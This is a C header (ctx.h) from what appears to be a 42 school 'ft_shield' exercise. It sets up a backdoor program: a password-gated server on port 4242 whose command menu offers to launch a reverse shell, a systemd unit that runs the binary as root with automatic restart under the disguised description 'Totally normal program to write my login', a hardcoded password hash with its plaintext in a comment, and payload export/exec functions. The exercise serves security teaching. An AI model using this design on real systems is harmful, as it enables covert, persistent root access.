/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   ctx.h                                              :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mbatty <mbatty@student.42angouleme.fr>     +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2025/11/21 11:24:44 by mbatty            #+#    #+#             */
/*   Updated: 2025/11/23 10:57:55 by mbatty           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#ifndef CTX_H
# define CTX_H

# include "server.h"
# include "sys/signal.h"
# include <stdio.h>
# include <fcntl.h>
# include <time.h>
# include <openssl/evp.h>

# define TEXT_RED "\033[31m"
# define TEXT_GREEN "\033[32m"
# define TEXT_YELLOW "\033[33m"
# define TEXT_BLUE "\033[36m"
# define TEXT_BOLD "\033[1m"
# define TEXT_RESET "\033[0m"

# define PASSWORD_PROMPT_TEXT		TEXT_YELLOW	TEXT_BOLD "Please enter the password to connect.\n"												TEXT_RESET
# define INCORRECT_PASSWORD_TEXT	TEXT_RED	TEXT_BOLD "Incorrect password!\n"																TEXT_RESET
# define CORRECT_PASSWORD_TEXT		TEXT_GREEN	TEXT_BOLD "Correct password, welcome in!\n" TEXT_BLUE "Write \'help\' for more information\n"	TEXT_RESET
# define WELCOME_TEXT				TEXT_BLUE	TEXT_BOLD "Welcome to ft_shield!\n"																TEXT_RESET
# define HELP_TEXT					TEXT_BLUE	TEXT_BOLD "shell: launch a reverse shell\nquit: close ft_shield\nhelp: see this\n"				TEXT_RESET
# define RVRS_SHELL_TEXT			TEXT_BLUE	TEXT_BOLD "Launching reverse shell.\n"															TEXT_RESET
# define UNKNOWN_COMMAND_TEXT		TEXT_BLUE	TEXT_BOLD "Unknown command. (see help)\n"														TEXT_RESET

# define LOWERCASE_HEXA "0123456789abcdef"
# define SERVER_PORT 4242

# define PASSWORD "c2b9ce9e110fe946e9bf5e63becb6e70" // mbatty42
# define LOGIN_42 "mbatty"

# define LOCK_FILE "/var/lock/ft_shield.lock"
# define LOG_FILE "/var/log/ft_shield.log"
# define SERVICE_FILE "/etc/systemd/system/ft_shield.service"

# define SERVICE_FILE_CONTENT "\
[Unit]\n\
Description=Totally normal program to write my login\n\
After=network.target\n\
StartLimitIntervalSec=0\n\
[Service]\n\
Type=forking\n\
PIDFile=/var/lock/ft_shield.lock\n\
Restart=always\n\
RestartSec=1\n\
User=root\n\
ExecStart=/bin/ft_shield\n\
\n\
[Install]\n\
WantedBy=multi-user.target"

typedef enum e_log_type
{
	LOG_INFO,
	LOG_LOG,
	LOG_ERROR,
	LOG_NONE,
}	t_log_type;

typedef struct s_ctx
{
	t_server	server;
	int			log_fd;
	int			lock_fd;
	bool		running;
}	t_ctx;

int	ctx_init(t_ctx *ctx);
int	ctx_delete(t_ctx *ctx, bool log);

void	message_hook(t_client *client, char *msg, void *ptr);
void	connect_hook(t_client *client, void *ptr);
void	disconnect_hook(t_client *client, void *ptr);
void	handle_sig(int sig);

char	*sha256(const char *input);

const char	*logger_get_log_header(t_log_type type);
void	logger_log_timestamp(int fd);
void	logger_log(t_ctx *ctx, t_log_type type, char *str, ...);

int	export_payload(char *src_path, char *dst_path);
void	exec_payload(char *payload_path, char **envp);

#endif
